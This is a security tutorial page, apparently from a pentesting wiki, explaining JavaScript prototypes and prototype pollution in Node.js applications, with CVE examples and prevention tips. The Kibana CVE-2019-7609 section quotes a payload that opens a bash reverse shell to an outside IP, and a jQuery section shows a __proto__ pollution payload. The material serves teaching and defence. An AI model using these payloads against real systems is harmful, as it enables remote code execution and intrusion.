# NodeJS - Prototype Pollution

**This post is based on the one from** [**https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7**](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)\*\*\*\*

## Objects in Javascript <a id="053a"></a>

First of all, we need to understand `Object`in javascript. An object is simply a collection of key and value pairs, often called properties of that object. For example:

![](.gitbook/assets/image%20%28398%29.png)

In Javascript, `Object`is a basic object, the template for all newly created objects. It is possible to create an empty object by passing `null`to `Object.create`. However, the newly created object will also have a type that corresponds to the passed parameter and inherits all the basic properties.

```javascript
console.log(Object.create(null)); // prints an empty object
```

![](.gitbook/assets/image%20%28393%29.png)

Previously we learned that an Oject in javascript is  collection of keys and values, so it makes sense that a `null` object is just an empty dictionary: `{}`

## Functions / Classes in Javascript <a id="55dd"></a>

In Javascript, the concepts of the class and the function are quite interrelated \(the function itself acts as the constructor for the class and the actual nature has no concept of “class” in javascript\). Let’s see the following example:

```javascript
function person(fullName, age) {
    this.age = age;
    this.fullName = fullName;
    this.details = function() {
        return this.fullName + " has age: " + this.age;
    }
}
```

![](.gitbook/assets/image%20%28400%29.png)

```javascript
var person1 = new person("Satoshi", 70);
```

![](.gitbook/assets/image%20%28397%29.png)

As you can se from the previous 2 images, the prototype of a function can be accessed form `function.prototype` and from an object of the function via `.__proto__`

## Prototypes in JavaScript <a id="3843"></a>

One thing to note is that the prototype attribute can be changed/modified/deleted when executing the code. For example functions to the class can be dynamically added:

![](.gitbook/assets/image%20%28394%29.png)

Functions of the class ca also be modified \(like `toString` or `valueOf` the following cases\):

![](.gitbook/assets/image%20%28399%29.png)

![](.gitbook/assets/image%20%28396%29.png)

## Inheritance

In a prototype-based program, objects inherit properties/methods from classes. The classes are derived by adding properties/methods to an instance of another class or by adding them to an empty object.

Note that, if you add a property to an object that is used as the prototype for a set of objects \(like the myPersonObj\), the objects for which it is the prototype also get the new property, but that property is not printed unless specifically called on.

![](.gitbook/assets/image%20%28395%29.png)

## Prototype Pollution <a id="0d0a"></a>

So where’s the prototype pollution? It happens when there’s a bug in the application that makes it possible to overwrite properties of `Object.prototype`. Since every typical object inherits its properties from `Object.prototype`, we can change application behavior. The most commonly shown example is the following:

```javascript
if (user.isAdmin) {   // do something important!}
```

Imagine that we have a prototype pollution that makes it possible to set `Object.prototype.isAdmin = true`. Then, unless the application explicitly assigned any value, `user.isAdmin` is always true!

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

For example, `obj[a][b] = value`. If the attacker can control the value of `a` and `value`, then he only needs to adjust the value of `a`to `__proto__`\(in javascript, `obj["__proto__"]` and `obj.__proto__`are completely equivalent\) then property `b` of all existing objects in the application will be assigned to `value`.

However, the attack is not as simple as the one above, according to [paper](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf), we can only attack when one of the following three conditions is met:

* Perform recursive merge
* Property definition by path
* Clone object

Let’s look through some errors:

### CVE-2019-7609

In [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) you can see a way to exploit this vulnerability and obtain a RCE abusing environmental variables:

```javascript
env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//'
env.NODE_OPTIONS='--require /proc/self/environ'
```

### CVE-2019–11358: Prototype pollution attack through jQuery $ .extend

$ .extend, if handled incorrectly, can change the properties of the object `prototype`\(the template of the objects in the app\). This attribute will then appear on all objects. Note that only the “deep” version \(ie g\) of $ .extened is affected.

Programmers often use this function to duplicate an object or fill in new properties from a default object. For example:

We can imagine `myObject`is an input field from the user and is serialized into the DB\)

In this code, we often think, when running will assign the attribute `isAdmin`into the newly created object. But essentially, it is assigned directly to `{}` and then `{}.isAdmin` will be `true`. If after this code, we perform the following check:

```javascript
If (user.isAdmin === true) {
    // do something for admin
}
```

If the user has not yet existed \( `undefined`\), the property`isAdmin`will be searched in its parent object, which is the Object added `isAdmin` with the value `true` above.

Another example when executed on JQuery 3.3.1:

```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```

These errors can affect a lot of Javascript projects, especially NodeJS projects, the most practical example is the error in Mongoose, the JS library that helps manipulate MongoDB, in December 2018.

### CVE-2018–3721, CVE-2019–10744: Prototype pollution attack through lodash

[Lodash](https://www.npmjs.com/package/lodash) is also a well-known library that provides a lot of different functions, helping us to write code more conveniently and more neatly with over 19 million weekly downloads. And It got the same problem as JQuery.

**CVE-2018–3721**

**CVE-2019–10744**

This bug affects all versions of Lodash, already fixed in version 4.17.11.

### What can I do to prevent?

* Freeze properties with Object.freeze \(Object.prototype\)
* Perform validation on the JSON inputs in accordance with the application’s schema
* Avoid using recursive merge functions in an unsafe manner
* Use objects without prototype properties, such as `Object.create(null)`, to avoid affecting the prototype chain
* Use `Map`instead of `Object`
* Regularly update new patches for libraries

## Reference

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)

